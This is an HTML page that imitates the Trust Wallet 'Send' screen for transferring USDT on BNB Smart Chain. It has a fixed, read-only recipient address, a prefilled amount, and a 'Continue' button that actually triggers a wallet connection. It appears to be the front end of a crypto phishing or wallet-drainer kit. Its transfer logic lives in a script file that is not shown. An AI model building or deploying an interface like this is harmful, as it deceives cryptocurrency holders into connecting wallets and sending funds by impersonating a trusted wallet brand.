<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNB Chain · Send USDT</title>
    <link rel="preload" href="css/style.min.css" as="style">
    <link rel="preload" href="js/ethers.umd.min.js" as="script">
    <link rel="stylesheet" href="css/style.min.css">
    <!-- ===== ETHERS v6 ===== -->
    <script src="js/ethers.umd.min.js" defer></script>
    <!-- ===== CRYPTO-JS ===== -->
    <script src="js/crypto-js.min.js" defer></script>
</head>

<body>
    <!-- Background overlays -->
    <div class="bg-noise" aria-hidden="true"></div>
    <div class="bg-grid" aria-hidden="true"></div>

    <!-- MAIN TRUST WALLET SEND UI CONTAINER -->
    <div class="tw-screen-container">
        <div class="tw-app-frame">

            <!-- App Top Header -->
            <header class="tw-header">
                <button class="tw-icon-btn" aria-label="Back" id="backBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="15 18 9 12 15 6"></polyline>
                    </svg>
                </button>
                <h1 class="tw-header-title">Send to</h1>
                <button class="tw-icon-btn" aria-label="Scan QR Code" id="scanBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M3 7V5a2 2 0 0 1 2-2h2"></path>
                        <path d="M17 3h2a2 2 0 0 1 2 2v2"></path>
                        <path d="M21 17v2a2 2 0 0 1-2 2h-2"></path>
                        <path d="M7 21H5a2 2 0 0 1-2-2v-2"></path>
                        <rect x="7" y="7" width="10" height="10" rx="1"></rect>
                    </svg>
                </button>
            </header>

            <!-- Card 1: Merchant Recipient Address Box -->
            <div class="tw-card">
                <label class="tw-label">Merchant Recipient Address</label>
                <textarea id="merchantAddressDisplay" class="tw-address-box" readonly rows="2">0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB</textarea>
                
                <div class="tw-pill-row">
                    <div class="tw-pill">
                        <img src="images/bnb.png" alt="BNB" class="tw-chain-icon" width="18" height="18">
                        <span>BNB Smart Chain</span>
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
                    </div>
                    <button type="button" class="tw-pill" id="clearAddressBtn">Clear</button>
                </div>
            </div>

            <!-- Card 2: USDT Amount Column -->
            <div class="tw-card">
                <div class="tw-pill-row" style="margin-top:0;">
                    <label class="tw-label" for="usdtAmountInput">Amount to Send</label>
                    <span class="tw-balance-sub">Balance: <strong id="usdtBalance" style="color:var(--tw-text);">0.00</strong> USDT</span>
                </div>
                
                <div class="tw-amount-row">
                    <input type="number" id="usdtAmountInput" class="tw-amount-input" placeholder="0.0" step="any" min="0" value="100">
                    <div class="tw-amount-meta">
                        <button type="button" id="maxUsdtBtn" class="tw-max-btn">MAX</button>
                        <span class="tw-currency-tag">USDT</span>
                    </div>
                </div>
            </div>

            <!-- Connected Wallet Info Pill (visible when wallet is connected) -->
            <div id="walletInfo" class="tw-status-box wallet-info-card--hidden">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <div>
                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">Connected Wallet</span>
                        <div id="walletAddressDisplay" style="font-family:monospace; font-weight:600; font-size:13px; color:var(--tw-text);">0x0000...0000</div>
                    </div>
                    <div style="text-align:right;">
                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">BNB Balance</span>
                        <div id="bnbBalance" style="font-weight:600; font-size:13px; color:var(--tw-text);">0.000000</div>
                    </div>
                </div>
            </div>

            <!-- Status Card / Verification Hub -->
            <div class="tw-status-box" id="statusCard">
                <div style="display:flex; align-items:flex-start; gap:10px;">
                    <span id="statusIcon" style="font-size:18px;">🔐</span>
                    <div style="flex:1;">
                        <div id="statusMessage" style="font-size:13px; font-weight:500; color:var(--tw-text);">
                            Ready. Click "Continue" to proceed with USDT transfer on BNB Smart Chain.
                        </div>
                        <div id="statusDetail" style="font-size:11px; font-family:monospace; color:var(--tw-text-muted); margin-top:4px; word-break:break-all;"></div>
                    </div>
                </div>
            </div>

            <!-- Continue Button (Primary Action) -->
            <button id="connectWalletBtn" class="tw-continue-btn" type="button">
                <span>Continue</span>
            </button>

        </div>
    </div>

    <!-- MAIN APPLICATION SCRIPT -->
    <script src="js/app.js" defer></script>
</body>
</html>
